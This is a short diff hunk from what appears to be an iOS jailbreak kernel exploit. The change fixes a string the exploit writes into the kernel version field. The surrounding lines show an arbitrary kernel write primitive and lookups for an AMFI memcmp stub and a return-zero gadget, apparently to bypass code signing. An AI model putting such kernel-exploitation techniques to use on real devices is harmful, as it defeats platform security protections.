@@ -518,7 +518,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 
     RemapPage(kernvers+whole_base-4);
     WriteAnywhere32(NewPointer(kernvers+whole_base-4), 1);
-    copyout(NewPointer(release+whole_base), "MarijunARM_", 11); /* marijuanarm */
+    copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
 
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
